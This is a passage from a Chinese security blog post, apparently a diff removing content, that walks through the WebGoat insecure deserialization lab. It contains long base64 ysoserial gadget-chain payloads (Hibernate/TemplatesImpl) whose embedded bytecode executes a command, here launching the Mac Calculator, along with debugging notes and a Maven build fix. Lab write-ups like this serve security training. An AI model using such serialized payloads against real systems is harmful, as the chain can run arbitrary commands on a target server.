yaWFsL1B3bmVyMTM5MDg1NjA1ODczNjE2OwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4ABAABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAC8AEgAAAAwAAQAAAAUAEwA-AAAAAQAVABYAAgAQAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAADQAEgAAACAAAwAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB4AAgAQAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAADgAEgAAACoABAAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAAgAKQAGAAEAEAAAACkAAwADAAAAFKcAAwFMuAAvEjG2ADVNLLYAO1exAAAAAQA8AAAAAwABAwACACMAAAACACQAJQAAAAoAAQAHACYAKAAJdXEAfgAuAAAB1Mr-ur4AAAA0ABsKAAIAAwcABAwABQAGAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgcACAEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vBwAKAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4AAQABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAADwAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEABwAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACtxAH4AMng</span><br></pre></td></tr></table></figure>
-
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>关键就两点：</p>
-<ol>
-<li>识别反序列化流量</li>
-<li>找到相应可利用执行命令的组件</li>
-</ol>
-<p>有时候需要特别修改ysoserial的内容来配合执行命令。</p>
-<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>可在<code>/WebGoat-develop/webgoat-container/src/main/resources/application.properties:6</code> 修改端口等信息</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/application-properties.png" alt="application-properties"></p>
-<p>更改反序列化payload为弹计算器，反序列化payload如下：</p>
-<p>（Mac下计算器路径是<code>/Applications/Calculator.app/Contents/MacOS/Calculator</code>）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAgTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHBxAH4AJnQAE2dldE91dHB1dFByb3BlcnRpZXN0AAR0ZXN0cHBwcHBwcHBwcHVyABpbTG9yZy5oaWJlcm5hdGUudHlwZS5UeXBlO36vq6HklWGaAgAAeHAAAAABcQB-ABJwcHNxAH4AIgAAAAD_____dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABwDK_rq-AAAANAA_CgACAAMHAAQMAAUABgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYHAD0BADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAoBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAHQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQA2L0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBABFqYXZhL2xhbmcvUHJvY2VzcwcANgEAB3dhaXRGb3IBAAMoKUkMADgAOQoANwA6AQANU3RhY2tNYXBUYWJsZQEAHXlzb3NlcmlhbC9Qd25lcjI4MzEwMDEyMDg1NDQ0AQAfTHlzb3NlcmlhbC9Qd25lcjI4MzEwMDEyMDg1NDQ0OwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4ABAABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAC8AEgAAAAwAAQAAAAUAEwA-AAAAAQAVABYAAgAQAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAADQAEgAAACAAAwAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB4AAgAQAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAADgAEgAAACoABAAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAAgAKQAGAAEAEAAAACkAAwADAAAAFKcAAwFMuAAvEjG2ADVNLLYAO1exAAAAAQA8AAAAAwABAwACACMAAAACACQAJQAAAAoAAQAHACYAKAAJdXEAfgAuAAAB1Mr-ur4AAAA0ABsKAAIAAwcABAwABQAGAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgcACAEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vBwAKAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4AAQABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAADwAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEABwAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACtxAH4AMng</span><br></pre></td></tr></table></figure>
-
-<p><code>/Users/seikei/.m2/repository/org/hibernate/hibernate-core/5.0.12.Final/hibernate-core-5.0.12.Final.jar!/org/hibernate/engine/spi/TypedValue.class</code></p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/TypeValue.png" alt="TypeValue"></p>
-<p><code>/Users/seikei/.m2/repository/org/hibernate/hibernate-core/5.0.12.Final/hibernate-core-5.0.12.Final.jar!/org/hibernate/property/access/spi/GetterMethodImpl.class</code></p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/GetterMethodImpl.png" alt="GetterMethodImpl"></p>
-<p><code>/Applications/IntelliJ IDEA.app/Contents/jbr/Contents/Home!/java.xml/jdk/xml/internal/JdkXmlFeatures.class</code></p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/JdkXmlFeatures.png" alt="JdkXmlFeatures"></p>
-<h2 id="Java报错"><a href="#Java报错" class="headerlink" title="Java报错"></a>Java报错</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Error:java: error: release version 5 not supported</span><br></pre></td></tr></table></figure>
-
-<p>在maven中添加</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
   </entry>
   <entry>
     <title>前端框架中XSS的代码表现形式</title>
